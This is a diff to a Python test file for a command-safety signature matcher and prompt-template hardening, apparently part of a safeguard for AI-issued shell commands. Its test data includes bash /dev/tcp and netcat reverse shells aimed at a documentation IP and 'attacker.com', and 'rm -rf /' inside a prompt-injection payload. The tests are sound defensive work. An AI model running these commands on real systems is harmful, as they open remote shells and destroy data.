@@ -12,6 +12,9 @@ import pytest
 from utils.security.signature_match import check_signature
 from utils.security.command_safety import _USER_PROMPT, SYSTEM_PROMPT
 
+# RFC 5737 documentation-range IP used in test payloads (not a real host).
+_TEST_IP = "198.51.100.1"
+
 
 # ---------------------------------------------------------------------------
 # 1. Signature matcher catches encoded / obfuscated payloads
@@ -31,7 +34,7 @@ class TestSignatureInjectionPayloads:
         assert v.rule_id == "lolbin-b64-pipe"
 
     @pytest.mark.parametrize("cmd", [
-        "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
+        f"bash -c 'bash -i >& /dev/tcp/{_TEST_IP}/4444 0>&1'",
         "echo x > /dev/tcp/attacker.com/80",
     ])
     def test_dev_tcp_reverse_shell(self, cmd):
@@ -40,8 +43,8 @@ class TestSignatureInjectionPayloads:
         assert v.rule_id == "lolbin-dev-tcp"
 
     @pytest.mark.parametrize("cmd", [
-        "nc 10.0.0.1 4444 -e /bin/bash",
-        "ncat 10.0.0.1 4444 -e /bin/sh",
+        f"nc {_TEST_IP} 4444 -e /bin/bash",
+        f"ncat {_TEST_IP} 4444 -e /bin/sh",
     ])
     def test_netcat_reverse_shell(self, cmd):
         v = check_signature(cmd)
@@ -102,8 +105,14 @@ class TestPromptTemplateHardening:
                 "command": "rm -rf /",
             }, ensure_ascii=False)
         )
-        assert "rm -rf /" in rendered
-        assert injection.replace('"', '\\"') in rendered or injection in rendered
+        fence_open = "```json"
+        start = rendered.index(fence_open) + len(fence_open)
+        end = rendered.index("```", start)
+        fenced = rendered[start:end]
+        assert "rm -rf /" in fenced
+        assert injection in fenced or injection.replace('"', '\\"') in fenced
+        outside = rendered[:rendered.index(fence_open)] + rendered[end + 3:]
+        assert injection not in outside
 
 
 # ---------------------------------------------------------------------------
